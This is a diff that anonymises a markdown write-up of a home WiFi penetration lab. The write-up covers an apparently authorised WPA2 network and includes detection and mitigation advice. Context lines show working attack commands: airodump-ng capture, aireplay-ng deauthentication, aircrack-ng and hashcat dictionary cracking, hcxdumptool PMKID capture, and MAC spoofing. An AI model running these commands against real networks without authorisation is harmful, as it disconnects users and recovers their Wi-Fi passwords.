@@ -22,7 +22,7 @@ This lab simulates a **black-box WiFi penetration test** against a home network 
 | Attacker Machine | Lenovo ThinkPad X250 — Kali Linux 6.18.12 |
 | Wireless Adapter | TP-Link Archer T2U Plus (RTL8821AU) |
 | Target AP | AVM Fritz!Box (WPA2-CCMP, Channel 6) |
-| SSID | Anonymaus |
+| SSID | Router |
 | Encryption | WPA2 CCMP PSK |
 | Connected Client | Mobile device (MAC: `BE:F8:5A:xx:xx:xx`) |
 
@@ -70,19 +70,19 @@ Target identified from surrounding networks:
 
 | BSSID | PWR | CH | ENC | CIPHER | ESSID |
 |---|---|---|---|---|---|
-| `42:65:DE:04:8A:B9` | -26 | 6 | WPA2 | CCMP | Anonymaus |
+| `42:65:DE:xx:xx:xx` | -26 | 6 | WPA2 | CCMP | Router |
 
 ### 1.3 Connected Client Discovery
 
 ```bash
-sudo airodump-ng -c 6 --bssid 42:65:DE:04:8A:B9 -w capture wlan1mon
+sudo airodump-ng -c 6 --bssid 42:65:DE:xx:xx:xx -w capture wlan1mon
 ```
 
 **Connected client detected:**
 
 | BSSID | STATION | PWR |
 |---|---|---|
-| `42:65:DE:04:8A:B9` | `BE:F8:5A:1C:92:C2` | -27 |
+| `42:65:DE:xx:xx:xx` | `BE:F8:5A:xx:xx:xx` | -27 |
 
 ---
 
@@ -91,7 +91,7 @@ sudo airodump-ng -c 6 --bssid 42:65:DE:04:8A:B9 -w capture wlan1mon
 ### 2.1 Targeted Capture
 
 ```bash
-sudo airodump-ng -c 6 --bssid 42:65:DE:04:8A:B9 -w /home/holy/capture4 wlan1mon
+sudo airodump-ng -c 6 --bssid 42:65:DE:xx:xx:xx -w /home/user/capture4 wlan1mon
 ```
 
 ### 2.2 Deauthentication Attack
@@ -99,13 +99,13 @@ sudo airodump-ng -c 6 --bssid 42:65:DE:04:8A:B9 -w /home/holy/capture4 wlan1mon
 Sent deauth frames to force client reconnection and trigger WPA2 4-way handshake:
 
 ```bash
-sudo aireplay-ng --deauth 20 -a 42:65:DE:04:8A:B9 -c BE:F8:5A:1C:92:C2 wlan1mon
+sudo aireplay-ng --deauth 20 -a 42:65:DE:xx:xx:xx -c BE:F8:5A:xx:xx:xx wlan1mon
 ```
 
 ### 2.3 Handshake Captured ✅
 
 ```
-WPA handshake: 42:65:DE:04:8A:B9
+WPA handshake: 42:65:DE:xx:xx:xx
 ```
 
 Capture file saved: `capture4-01.cap`
@@ -117,7 +117,7 @@ Capture file saved: `capture4-01.cap`
 ### 3.1 Dictionary Attack
 
 ```bash
-sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/holy/capture4-01.cap
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/user/capture4-01.cap
 ```
 
 **Result:** Key not found in rockyou.txt (14,344,391 passwords tested)
@@ -159,12 +159,12 @@ sudo systemctl stop NetworkManager
 BSSID filter applied to scope the attack to the authorized target only:
 
 ```bash
-sudo hcxdumptool -i wlan1 -w /home/holy/pmkid.pcapng --bssid 42:65:DE:04:8A:B9
+sudo hcxdumptool -i wlan1 -w /home/user/pmkid.pcapng --bssid 42:65:DE:xx:xx:xx
 ```
 
 | Parameter | Purpose |
 |---|---|
-| `--bssid 42:65:DE:04:8A:B9` | Restrict capture to authorized AP only — no other networks targeted |
+| `--bssid 42:65:DE:xx:xx:xx` | Restrict capture to authorized AP only — no other networks targeted |
 
 **Result after ~7 minutes:**
 ```
@@ -175,7 +175,7 @@ sudo hcxdumptool -i wlan1 -w /home/holy/pmkid.pcapng --bssid 42:65:DE:04:8A:B9
 ### 3.5.3 Convert to Hash Format
 
 ```bash
-hcxpcapngtool -o /home/holy/pmkid.hash /home/holy/pmkid.pcapng
+hcxpcapngtool -o /home/user/pmkid.hash /home/user/pmkid.pcapng
 ```
 
 **Key output:**
@@ -191,7 +191,7 @@ Hashes: 8 digests; 6 unique salts
 ### 3.5.4 Offline Cracking with Hashcat
 
 ```bash
-hashcat -m 22000 /home/holy/pmkid.hash /usr/share/wordlists/rockyou.txt --force
+hashcat -m 22000 /home/user/pmkid.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
 **Result:**
@@ -230,7 +230,7 @@ macchanger -s wlan1mon
 | Detection Method | Description |
 |---|---|
 | **Deauth frames** | Wireshark filter: `wlan.fc.type_subtype == 0x000c` — sudden deauth spike is a clear indicator |
-| **Fritz!Box logs** | Unknown MAC address appears in connected devices log |
+| **Router logs** | Unknown MAC address appears in connected devices log |
 | **Signal anomaly** | Sudden client disconnection followed by immediate reconnection |
 | **Passive monitoring** | IDS/SIEM alert on mass deauth frames — next lab objective |
 
@@ -244,10 +244,10 @@ macchanger -s wlan1mon
 5. Consider WPA3 upgrade if supported
 ```
 
-### 5.3 Fritz!Box Push Service (Quick Win)
+### 5.3 Router Push Service (Quick Win)
 
 ```
-Fritz!Box → System → Push Service → New WLAN device connected
+Router → System → Push Service → New WLAN device connected
 ```
 Sends email notification when an unknown device joins the network.
 
@@ -332,4 +332,4 @@ Sends email notification when an unknown device joins the network.
 - [WPA2 4-Way Handshake — IEEE 802.11i](https://en.wikipedia.org/wiki/IEEE_802.11i-2004)
 ---
 
-*Lab completed: 2026-03-20 | Author: holy@h4des | Platform: Kali Linux 6.18.12*
+*Lab completed: 2026-03-20 | Author: user@user | Platform: Kali Linux 6.18.12*
